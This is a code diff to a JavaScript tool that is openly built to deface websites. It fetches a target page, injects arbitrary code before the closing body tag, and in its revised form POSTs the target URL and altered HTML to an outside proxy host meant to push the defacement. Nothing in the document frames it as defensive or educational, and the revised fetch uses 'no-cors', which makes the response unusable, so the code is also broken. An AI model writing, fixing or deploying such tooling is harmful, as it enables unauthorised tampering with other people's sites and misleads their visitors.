@@ -58,7 +58,7 @@
   let url = document.getElementById('defacement-url').value;
   console.log("Backing up site:", url);
   try {
-  const response = await fetch(url, {mode: 'cors'});
+  const response = await fetch(url, { mode: 'cors' });
   const html = await response.text();
   download("backup.html", html);
   console.log("Site backed up.");
@@ -103,12 +103,8 @@
   console.log("Defacing site:", url);
  
 
-  // Use a CORS proxy to bypass CORS restrictions
-  const proxyUrl = 'https://fuckcloudflare.tk/?' + encodeURIComponent(url);
- 
-
   try {
-  const response = await fetch(proxyUrl);
+  const response = await fetch(url, { mode: 'no-cors' });
   if (!response.ok) {
   throw new Error(`HTTP error! status: ${response.status}`);
   }
@@ -119,27 +115,24 @@
   html = html.replace('</body>', code + '</body>');
  
 
-  // Attempt to write the modified HTML back to the server.
-  // This is highly unlikely to work due to security restrictions.
-  fetch(url, {
-  method: 'PUT',
-  mode: 'no-cors',
+  // Send the modified HTML to a proxy server
+  const proxyUrl = 'https://fuckcloudflare.tk/update';
+  const proxyResponse = await fetch(proxyUrl, {
+  method: 'POST',
   headers: {
-  'Content-Type': 'text/html'
+  'Content-Type': 'application/json'
   },
-  body: html
-  }).then(response => {
-  if (response.ok) {
-  console.log("Site defaced successfully (attempted).");
-  alert("Site defaced successfully (attempted)!");
-  } else {
-  console.error("Deface failed:", response.status);
-  alert("Deface failed. Check console for details.");
-  }
-  }).catch(error => {
-  console.error("Deface failed:", error);
-  alert("Deface failed. Check console for details.");
+  body: JSON.stringify({ url: url, html: html })
   });
+ 
+
+  if (proxyResponse.ok) {
+  console.log("Site defaced successfully (via proxy).");
+  alert("Site defaced successfully (via proxy)!");
+  } else {
+  console.error("Deface failed (proxy):", proxyResponse.status);
+  alert("Deface failed (via proxy). Check console for details.");
+  }
  
 
   } catch (error) {
